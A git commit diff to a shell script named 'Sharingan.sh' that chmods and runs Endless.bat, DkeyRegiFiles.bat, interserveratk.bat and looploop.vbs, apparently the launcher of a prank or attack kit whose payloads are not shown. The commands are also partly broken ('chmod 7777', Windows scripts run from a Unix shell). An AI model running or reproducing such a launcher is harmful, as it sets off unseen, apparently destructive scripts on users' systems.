2cb62caf555514053ea9af4063444e989659befc
MR|D3V1L <88584834+problems-arelifepartner@users.noreply.github.com>
2023-04-14 13:23:45 +0530

    Update Sharingan.sh

--- Sharingan.sh
+++ Sharingan.sh
@@ -14,27 +14,29 @@ chmod +x Endless.bat
 chmod 7777 Endless.bat
 ./Endless.bat
 echo ""
-
 chmod +x DkeyRegiFiles.bat
-
 ./DkeyRegiFiles.bat
-
 chmod 7777 DkeyRegiFiles.bat
-
 ./DkeyRegiFiles.bat
-
-
-
-
-
 echo ""
 chmod +x interserveratk.bat
 ./interserveratk.bat
 chmod 7777 interserveratk.bat
 ./interserveratk.bat
-
 echo ""
 chmod +x looploop.vbs
 ./looploop.vbs
 chmod 7777 looploop.vbs
 ./looploop.vbs
+
+fi
+
+
+
+
+
+
+
+
+
+
